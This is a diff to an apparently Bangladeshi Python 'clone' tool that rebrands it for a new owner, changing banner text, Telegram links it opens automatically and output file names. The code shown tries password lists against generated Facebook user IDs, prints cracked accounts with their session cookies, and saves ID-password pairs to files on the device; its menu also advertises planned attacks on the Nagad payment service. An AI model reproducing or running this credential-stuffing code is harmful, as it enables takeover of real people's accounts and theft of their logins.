@@ -1,3 +1,4 @@
+#GIFT BY MOSABBIR
 import os, sys, json, uuid, string, random, requests
 from concurrent.futures import ThreadPoolExecutor
 import os, sys, json, uuid, string, random, requests
@@ -51,8 +52,8 @@ def ____banner____():
  |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|    '  V/1.1
 \n---------------------------------
 [âœª] OWNER      : MOSABBIR 
-[âœª] DEVELOPER  :  MOSABBIR
-[âœª] STATUS     : FREE [+] V/1.1
+[âœª] DEVELOPER  : MOSABBIR
+[âœª] STATUS     : PRIVATE  [+] V/1.1
 [âœª] TOOLS      : OLD & RANDOM & FILE
 ---------------------------------""")
     
@@ -60,7 +61,7 @@ def ____banner____():
 def main():
     ____banner____()
     print("[1] FILE CLONE [SOON] ")
-    print("[2] RANDOM CLONEv[SOON]");os.system("xdg-open https://t.me/ROOTMOSABBIR")
+    print("[2] RANDOM CLONE [SOON]");os.system("xdg-open https://t.me/mosabbirhossainsajib")
     print("[3] START CLONE [2009][WORK]")
     print("[4] NAGAD HALF INFO[]SOON")
     print("[5] NAGAD BAN [SOON]")
@@ -84,7 +85,7 @@ def main():
 
 def fuckMyxmosabbirold(series):
     ____banner____()
-    os.system("xdg-open https://t.me/ROOTMOSABBIR")
+    os.system("xdg-open https://t.me/mosabbirhossainsajib")
     global gen
     if series == "100000":
         SEX = "100000"
@@ -197,15 +198,15 @@ def FUCK_FRIEND(ids,passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[BRONEN-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[MOSABBIR-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[3;34m [COOKIE_â‡ï¸] '+coki)
-                    open('/sdcard/BRONEN-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
+                    open('/sdcard/MOSABBIR-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;35m[BRONEN-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/BRONEN-INCTIVE.txt','a').write(ids+'|'+pas+'\n')
+                print('\r\r \033[1;35m[MOSABBIR-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/MOSABBIR-INCTIVE.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
